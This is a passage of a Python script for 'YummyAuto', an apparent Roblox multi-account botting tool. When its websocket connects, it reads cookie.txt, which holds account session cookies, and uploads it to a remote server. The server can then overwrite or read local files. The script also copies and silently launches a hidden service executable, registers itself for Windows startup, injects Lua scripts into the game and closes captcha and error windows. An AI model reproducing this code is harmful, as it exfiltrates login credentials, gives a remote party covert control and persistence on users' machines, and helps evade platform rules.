def is_valid_yummyauto_key(key: str) -> bool:
    return bool(re.match(r"^YUMMYAUTO-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$", str(key or "")))


WS_FILES_MAP = {
    "cookie.txt": ["cookie.txt", "text"],
    "bloxfruit.json": ["stored/bloxfruit.json", "json"],
    "dfbloxfruit.json": ["stored/dfbloxfruit.json", "json"],
    "pet99.json": ["stored/pet99.json", "json"],
    "config.json": ["config.json", "json"],
}


def read_file(file_name):
    if file_name not in WS_FILES_MAP:
        return None
    path, mode = WS_FILES_MAP[file_name]
    if not os.path.exists(path):
        return None
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f) if mode == "json" else f.read()


def write_file(file_name, content):
    if file_name not in WS_FILES_MAP:
        return False
    path, mode = WS_FILES_MAP[file_name]
    try:
        if mode == "json":
            data = json.loads(content) if isinstance(content, str) else content
            with open(path, "w", encoding="utf-8-sig") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
        else:
            with open(path, "w", encoding="utf-8-sig") as f:
                f.write(str(content))
        return True
    except Exception as e:
        error(f"Write File ERROR {file_name}: {e}")
        return False


def build_payload(file_name, content, action, user_id):
    return {
        "platform": "tool",
        "target": "dashboard",
        "source": "auto",
        "data": {
            "user_id": user_id,
            "user_key": USER_KEY,
            "action": action,
            "file_name": file_name,
            "content": content,
        },
    }


async def send_payload(ws, payload):
    await ws.send(json.dumps(payload))


async def on_message(ws, message):
    global config
    msg = json.loads(message)
    data = msg.get("data", {})
    file_name = data.get("file_name")
    action = data.get("action")
    user_id = data.get("user_id")
    user_key = data.get("user_key")
    if user_id != auth.get("UserID (UUID)") or user_key != auth.get("Key"):
        return
    if action == "upload":
        content = data.get("content", "")
        if write_file(file_name, content):
            if file_name == "config.json":
                auth1 = read_or_create_auth("auth.json")
                config = refresh_runtime_config_state(read_or_create_config(auth1, "config.json"), "config.json")
            await send_payload(
                ws,
                {
                    "platform": "tool",
                    "target": "dashboard",
                    "source": "auto",
                    "data": {"status": "success", "message": f"Wrote content to {file_name}"},
                },
            )
    elif action == "edit":
        content = read_file(file_name)
        await send_payload(ws, build_payload(file_name, content, "result", RESULT_USER_ID))


async def on_open(ws):
    content = read_file("cookie.txt")
    await send_payload(ws, build_payload("cookie.txt", content, "upload", RESULT_USER_ID))


async def listen():
    while True:
        try:
            async with websockets.connect(URL) as ws:
                await on_open(ws)
                async for message in ws:
                    await on_message(ws, message)
        except Exception:
            await asyncio.sleep(30)


round_counter = 0


def set_low_priority_and_affinity_4core_group():
    global round_counter
    group_size = config.get("Affinity Core", 4)
    total_cores = psutil.cpu_count(logical=True) or 4
    cpu_groups = chunk_list(list(range(total_cores)), group_size)
    while True:
        pids = [
            p.info["pid"]
            for p in psutil.process_iter(attrs=["pid", "name"])
            if (p.info.get("name") or "") == "RobloxPlayerBeta.exe"
        ]
        for i, pid in enumerate(pids):
            try:
                p = psutil.Process(pid)
                p.nice(psutil.IDLE_PRIORITY_CLASS)
                grp_idx = (round_counter + i) % len(cpu_groups)
                p.cpu_affinity(cpu_groups[grp_idx])
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass
        round_counter += 1
        time.sleep(150)


def set_low_priority_for_roblox():
    while True:
        for proc in psutil.process_iter(attrs=["pid", "name"]):
            try:
                if (proc.info.get("name") or "") == "RobloxPlayerBeta.exe":
                    psutil.Process(proc.info["pid"]).nice(psutil.IDLE_PRIORITY_CLASS)
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass
        time.sleep(30)


def sort_roblox_tabs():
    while True:
        roblox_windows = [
            w for w in gw.getAllWindows() if w.title == "Roblox" or any(u in w.title for u in setusername)
        ]
        w_per_row = config.get("Windows Per Rows", 10)
        for i, win in enumerate(roblox_windows):
            try:
                win.resizeTo(50, 50)
                win.moveTo((i % w_per_row) * 100, (i // w_per_row) * 100)
            except Exception:
                pass
        time.sleep(60)


def get_webplayer_version():
    url = "https://auth.testwebyummy.click/webplayer-version"
    for _ in range(3):
        try:
            response = authsession2.get(url, timeout=15)
            if response.status_code == 200:
                if response.text.strip() == version:
                    return "ABC"
                return response.text.strip()
        except Exception:
            pass
    return "ABC"


threading.Thread(target=detect_and_lock_roblox_file, daemon=True).start()

if config.get("Mute Sounds"):
    try:
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        import comtypes

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, comtypes.CLSCTX_ALL, None)
        volume = comtypes.cast(interface, comtypes.POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
    except Exception:
        pass


def restart_program(file_path, process_name):
    for proc in psutil.process_iter(attrs=["pid", "name"]):
        try:
            if (proc.info.get("name") or "") == process_name:
                os.kill(proc.info["pid"], 9)
        except Exception:
            pass
    os.startfile(file_path)


def load_or_create_signing_key(SERVICE, ACCOUNT):
    s = keyring.get_password(SERVICE, ACCOUNT)
    if s:
        return SigningKey(base64.b64decode(s))
    sk = SigningKey.generate()
    keyring.set_password(SERVICE, ACCOUNT, base64.b64encode(bytes(sk)).decode())
    return sk


def sha256_hex(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def pow_solve(nonce_b64: str, zeros: int) -> str:
    nonce = base64.urlsafe_b64decode(nonce_b64 + "==")
    target_prefix = "0" * zeros
    i = 0
    while True:
        h = hashlib.sha256(nonce + str(i).encode()).hexdigest()
        if h.startswith(target_prefix):
            return str(i)
        i += 1


def http_post_retry(url, max_attempts=5, **kwargs):
    last_err = None
    for _ in range(max_attempts):
        try:
            r = requests.post(url, **kwargs)
            r.raise_for_status()
            return r
        except requests.RequestException as e:
            last_err = e
            time.sleep(3)
    raise last_err


def main_flow_then_check_key():
    SERVER = os.getenv("SRV", "https://auth.testwebyummy.click")
    DEVICE_ID = f"{auth.get('Key')}+{auth.get('UserID (UUID)')}"
    SERVICE = "yummy"
    ACCOUNT = auth.get("Key", "")
    try:
        sk = load_or_create_signing_key(SERVICE, ACCOUNT)
        vk_b64 = base64.b64encode(bytes(sk.verify_key)).decode()
        http_post_retry(
            f"{SERVER}/register",
            json={"device_id": DEVICE_ID, "public_key_b64": vk_b64},
            timeout=15,
        )
        r = http_post_retry(
            f"{SERVER}/challenge/start",
            json={"device_id": DEVICE_ID},
            timeout=15,
        )
        ch = r.json()
        nonce_b64 = ch["nonce"]
        server_time = ch["server_time"]
        zeros = int(ch["difficulty_hex_zeros"])
        server_ephemeral_pub_b64 = ch["server_ephemeral_pub_b64"]
        sig_context = ch["sig_context"].encode()
        ctr = pow_solve(nonce_b64, zeros)
        ce_sk = PrivateKey.generate()
        ce_pk_b64 = base64.b64encode(bytes(ce_sk.public_key)).decode()
        body = json.dumps(
            {"action": "warmup", "t": int(time.time()), "device": DEVICE_ID},
            separators=(",", ":"),
        ).encode()
        body_hash = sha256_hex(body)
        msg = (
            sig_context
            + b"|did:" + DEVICE_ID.encode()
            + b"|m:POST|p:/secure-action|bh:" + body_hash.encode()
            + b"|ts:" + str(server_time).encode()
            + b"|ctr:" + ctr.encode()
            + b"|sepk:" + server_ephemeral_pub_b64.encode()
            + b"|cepk:" + ce_pk_b64.encode()
        )
        sig_b64 = base64.b64encode(sk.sign(msg).signature).decode()
        box = Box(ce_sk, PublicKey(base64.b64decode(server_ephemeral_pub_b64)))
        cipher_nonce = nacl_random(Box.NONCE_SIZE)
        encrypted_body = box.encrypt(body, cipher_nonce).ciphertext
        headers = {
            "X-Device-Id": DEVICE_ID,
            "X-Nonce": nonce_b64,
            "X-Timestamp": str(server_time),
            "X-PoW-Counter": ctr,
            "X-Client-Ephemeral-Key": ce_pk_b64,
            "X-Signature": sig_b64,
            "X-Body-SHA256": body_hash,
            "X-Cipher-Nonce": base64.b64encode(cipher_nonce).decode(),
            "Content-Type": "application/octet-stream",
        }
        http_post_retry(f"{SERVER}/secure-action", headers=headers, data=encrypted_body, timeout=15)
        if not _warmup_crypto_backend(max_attempts=10, base_delay=0.25):
            warn("PyCryptodome native backend not ready; auth thread will keep retrying.")
        threading.Thread(target=checkingwhitelist, args=(), daemon=True).start()
    except Exception as e:
        error(f"[fatal] unexpected error: {e}")


def on_action(_):
    pass


def on_error(_):
    pass


def on_hotkey():
    threading.Thread(target=killproc, daemon=True).start()


def yummyauto_bootstrap():
    cur = Path(sys.executable).resolve().parent if getattr(sys, "frozen", False) else Path.cwd()
    payload_service = cur / "log" / "yummyauto_service.exe"
    payload_auth = cur / "auth.json"
    local_app = os.environ.get("LOCALAPPDATA") or os.path.expanduser("~")
    dst_dir = Path(local_app) / "yummyauto"
    dst_dir.mkdir(parents=True, exist_ok=True)
    dst_service = dst_dir / "yummyauto_service.exe"
    if payload_service.exists() and not dst_service.exists():
        shutil.copy2(payload_service, dst_service)
    if dst_service.exists() and not _is_process_running("yummyauto_service.exe"):
        try:
            subprocess.Popen(
                [str(dst_service)],
                cwd=str(dst_dir),
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=0x08000008,
            )
        except Exception:
            pass


# ============================================================================
# Main Entry Execution Flow
# ============================================================================

if __name__ == "__main__":
    getversion = get_webplayer_version()
    if getversion == "ABC":
        HEALTHZ = healthz()
        verify_certificate_with_pem("yummyauto.app", 443, HEALTHZ, "log/yummeo.pem")
        if os.path.exists("log/yummeo.pem"):
            os.remove("log/yummeo.pem")
        FIXED_KEY = bytes.fromhex(xor_decrypt("724c25ba06e56f164da74d098b7068d6"))

        if auth.get("UserID (UUID)") and auth.get("Key") and auth.get("Note"):
            info("Loading Whitelist ...")
            info("Disable IPv6 if this step takes too long.")
            main_flow_then_check_key()
            threading.Thread(
                target=send_data_to_server,
                args=(auth.get("UserID (UUID)"), auth.get("Key"), auth.get("Note")),
                daemon=True,
            ).start()
            threading.Thread(target=check_presence_and_handle, daemon=True).start()
            run_update_exe(False)
        else:
            error("Please fill in UUID, Key, and Note in auth.json.")

        if discordid != 123:
            post_import_account()
            post_imported_account()

        if config.get("Startup With Windows"):
            add_to_startup()
        else:
            remove_from_startup()

        info("Authenticating cookie data... ")
        keyboard.add_hotkey("ctrl+r", on_hotkey)
        keyboard.add_hotkey(
            "ctrl+t",
            lambda: threading.Thread(target=arrange_roblox_windows_hotkey_once, daemon=True).start(),
        )
        load_user_data("stored/savedata.txt")
        read_cookie_file("cookie.txt")
        threading.Thread(target=restartroblox, daemon=True).start()
        check_cookie(thread_count=30)

        if str(config.get("PlaceId")) == "2753915549":
            pushchange("allscript/bloxfruitchangeacc.txt")
        elif str(config.get("PlaceId")) == "8737899170":
            pushchange("allscript/pet99changeacc.txt")
        pushchange("allscript/checkyummy.lua")

        process_name = "RobloxPlayerBeta.exe"
        cookie_file = "cookie.txt"
        title_thread = threading.Thread(target=update_console_title, args=(cookie_file,), daemon=True)
        title_thread.start()

        if config.get("Sort") and config.get("Minimize"):
            error("Cannot perform both sorting and minimizing at the same time. (Applying Minimize)")
            time.sleep(3)
            threading.Thread(target=minimize_all_roblox_windows, daemon=True).start()
        elif config.get("Sort"):
            if config.get("Old Sort"):
                threading.Thread(target=sort_roblox_tabs, daemon=True).start()
            else:
                threading.Thread(target=arrange_roblox_windows, daemon=True).start()
        elif config.get("Minimize"):
            threading.Thread(target=minimize_all_roblox_windows, daemon=True).start()

        titles_to_close = [
            "Authentication Failed",
            "ERROR",
            "WerFault.exe - Application Error",
            "Error",
            "Notice",
        ]
        threading.Thread(target=close_specific_windows, args=(titles_to_close,), daemon=True).start()

        if config.get("Set Affinity"):
            threading.Thread(target=set_low_priority_and_affinity_4core_group, daemon=True).start()
        if config.get("Set Priority Low"):
            threading.Thread(target=set_low_priority_for_roblox, daemon=True).start()
        if config.get("Kill Process > Ram"):
            threading.Thread(target=killgheavyprocess, daemon=True).start()

        threading.Thread(target=openfpsuncloker, daemon=True).start()

        if config.get("Auto Detect/Run Update.exe"):
            threading.Thread(target=runautoupdate, daemon=True).start()
        if config.get("Webhook Url"):
            threading.Thread(target=send_webhook, daemon=True).start()
        if config.get("Change Account (Captcha)"):
            _start_captcha_scan_thread()
        if config.get("Kill Seliware Error Message"):
            threading.Thread(target=kill_seliware_errormess, daemon=True).start()
        if config.get("Run Multi PlaceId"):
            multi_games_list = handle_multi_game()

        client = start_socketio_client(on_action=on_action, on_error=on_error)

        if config.get("Close Roblox (Captcha)"):
            t = threading.Thread(target=kill_captcha, daemon=True)
            t.start()

        time.sleep(1)
        os.system("cls")
        switched_count = count_lines_in_file("switched/storeddata.txt")
        info(
            f"[Cookie Report] Total: {len(cookies_list)} | Config: {len(valid_cookies)} "
            f"| Valid: {len(valid_cookies_trimmed)} | Dead: {totaldeadcookie} "
            f"| Check Failed: {total_timeout} | Switched: {switched_count}"
        )

        while True:
            startroblox()
            time.sleep(config.get("Threading Delay", 30))
    else:
        warn("Found New Update run update.exe in 3s")
        time.sleep(3)
        run_update_exe(True)
